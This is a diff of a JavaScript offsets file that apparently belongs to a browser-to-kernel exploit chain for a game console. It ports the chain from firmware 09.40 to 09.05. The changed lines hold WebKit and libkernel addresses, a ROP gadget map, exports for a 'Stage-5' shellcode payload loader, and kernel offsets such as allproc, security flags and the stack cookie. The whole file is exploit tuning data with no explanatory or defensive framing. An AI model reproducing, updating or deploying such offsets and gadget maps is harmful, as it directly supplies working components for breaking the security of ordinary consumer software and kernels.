@@ -1,18 +1,19 @@
-// 09.40 -- generated from libSceNKWebKit / libkernel_web /
-// libSceLibcInternal. file offset = rva + 0x4000
+// 09.05 candidate -- 09.00 userland seed pending exact module-hash confirmation.
+// Verified 09.05 kernel offsets are kept separately at the end of this file.
 
 // host-constructor candidates: webkitBase = nativeCtorAddr - hc
 const OFFSET_wk_host_constructor_candidates = [0x00034F98, 0x00035808, 0x00035900];
 // Exact WKDownloadGetTypeID export (NID -x5vK4NNNYM).
-const OFFSET_wk_vtable_first_element     = 0x00285150;
-const OFFSET_wk_memset_import                  = 0x033C3ED0;
-const OFFSET_wk___stack_chk_guard_import       = 0x033C18D8;
+const OFFSET_wk_vtable_first_element     = 0x00285170;
+const OFFSET_wk_memset_import                  = 0x033C3EC0;
+const OFFSET_wk___stack_chk_guard_import       = 0x033C18C8;
 
 const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
 const OFFSET_lk_pthread_create_name_np         = 0x00020F80;
 const OFFSET_lk_pthread_join                   = 0x000220A0;
 const OFFSET_lk_pthread_exit                   = 0x00021310;
-// Exact retail exports used by the Stage-5 payload loader.
+// Stage-5 payload loader ABI.  These exact scePthread exports are used by the
+// original AioShellcode loader together with an explicit 0x80000-byte stack.
 const OFFSET_lk_scePthreadCreate               = 0x000078C0;
 const OFFSET_lk_scePthreadJoin                 = 0x0000B170;
 const OFFSET_lk_scePthreadAttrInit             = 0x00014AD0;
@@ -43,30 +44,30 @@ const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB68;
 
 let wk_gadgetmap = {
 	"ret": 0x000000C7,
-	"pop rdi": 0x0008B61D,
+	"pop rdi": 0x0017324D,
 	"pop rsi": 0x00030C9E,
-	"pop rdx": 0x00065770,
+	"pop rdx": 0x0000EA62,
 	"pop rcx": 0x00019F15,
 	"pop rax": 0x0002661D,
 	"pop rsp": 0x0001076D,
-	"pop r8": 0x01D19B6F,
-	"pop r9": 0x00248556,
+	"pop r8": 0x01D1992F,
+	"pop r9": 0x00248576,
 	"mov [rdi], rsi": 0x0000F347,
 	"mov [rdi], rax": 0x0009F1AF,
 	"mov [rdi], eax": 0x000168AE,
-	"mov rax, [rax]": 0x001761EB,
-	"add rax, rcx": 0x0034CA65,
+	"mov rax, [rax]": 0x0017620B,
+	"add rax, rcx": 0x0034CA85,
 	"cmp [rcx], eax": 0x00ED2AA3,
-	"inc dword [rax]": 0x00200684,
+	"inc dword [rax]": 0x002006A4,
 	"seta al": 0x0008BA66,
 	"setb al": 0x0000A6AF,
 	"sete al": 0x00015A1B,
 	"setg al": 0x01049D56,
-	"setl al": 0x0026DE9E,
-	"shl rax, 3": 0x01C90483,
+	"setl al": 0x0026DEBE,
+	"shl rax, 3": 0x01C90243,
 	"shl rax, 4": 0x00D1EC52,
 	"shr rax, 3": 0x00D12567,
-	"shr rax, 4": 0x01B08B13,
+	"shr rax, 4": 0x01B088D3,
 	"infloop": 0x00033061,
 };
 
@@ -409,7 +410,7 @@ let syscall_map = {
 const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
 const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
 const OFFSET_KERNEL_DATA                        = 0x00CA0000;
-const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x005B7F92;
+const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x005B7E52;
 const OFFSET_KERNEL_ALLPROC                     = 0x033F5D50;
 const OFFSET_KERNEL_SECURITY_FLAGS              = 0x01A13064;
 const OFFSET_KERNEL_TARGETID                    = 0x01A1306D;
